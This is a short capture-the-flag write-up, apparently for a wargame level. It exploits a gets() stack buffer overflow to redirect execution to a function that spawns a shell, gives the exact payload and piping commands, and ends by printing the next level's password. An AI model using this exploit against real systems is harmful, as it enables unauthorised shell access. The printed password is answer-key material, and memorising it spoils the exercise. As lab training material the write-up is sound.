@@ -1,0 +1,30 @@
+For this level we have to exploit a buffer overflow vulnerability through gets() functions;
+
+disassemble with gdb, we can see gets store the result of the STDIN inside a stack pointer,
+and we also see a function called "run", that calls system("/bin/sh"), so we know we have to exploit it.
+
+we can find the padding with giving a large string from gets() STDIN and find the offset by printing $ebp
+when the padding is found, we have to fill it to fully fill $esp + $ebp, and then overwrite $eip with an address that we wan to be redirect to
+in this case, to the function "run"
+
+here is the padding + the LITTLE ENDIAN address in byte string
+python -c "import sys; sys.stdout.write('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\x44\x84\x04\x08')" > /tmp/input
+
+./level1 < /tmp/input will not work because after reading from file, it will close stdin, and since /bin/sh read from stdin it will close immediatly and exit
+
+if you want to provide additional input, we need to use a trick to not break the input stream.
+
+{ cat /tmp/input ; cat - ; } | ./level1
+
+on the first cat it will provide the file content to stdin, and then re-open an STDIN with CAT for the /bin/sh that is system() later in the code.
+
+SO THE FULL RESULT :
+
+python -c "import sys; sys.stdout.write('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\x44\x84\x04\x08')" > /tmp/input
+
+{ cat /tmp/input; cat -; } | ./level1;
+
+Good... Wait what?
+cd /home/user/level2
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
